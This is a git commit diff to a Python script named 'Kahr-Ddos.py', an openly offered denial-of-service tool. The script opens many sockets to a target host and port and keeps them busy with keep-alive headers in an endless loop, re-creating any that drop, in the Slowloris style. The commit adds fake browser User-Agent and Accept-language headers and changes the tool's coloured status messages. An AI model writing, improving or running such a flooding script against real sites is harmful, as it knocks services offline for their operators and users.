78e14d62415a635ded61eaf5f3df8d9460e1011f
Ozcon99 <ozcon09@gmail.com>
2025-08-24 07:24:15 +0700

    Update Kahr-Ddos.py

--- Kahr-Ddos.py
+++ Kahr-Ddos.py
@@ -33,6 +33,9 @@ logo = """
 """
 faded_text = fade.fire(logo)
 print(faded_text)
+regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                    "Accept-language: en-US,en,q=0.5"]
+
 def init_socket(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
@@ -46,7 +49,7 @@ def init_socket(ip,port):
 
 def main():
     if len(sys.argv)<5:
-        print(("\033[92mUsage: {} example.com 80 100 10".format(sys.argv[0])))
+        print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
         return
 
     ip = sys.argv[1]
@@ -67,7 +70,7 @@ def main():
     bar.finish()
 
     while True:
-        print(("\033[92m [÷] Kahr Connection to the web {}".format(len(socket_list))))
+        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
 
         for s in socket_list:
             try:
@@ -76,7 +79,7 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[33m {}    sends packets...".format(len(socket_list)))) ".format("\n")))
+            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
@@ -88,3 +91,8 @@ def main():
 
 if __name__=="__main__":
     main()
+
+
+
+
+ 
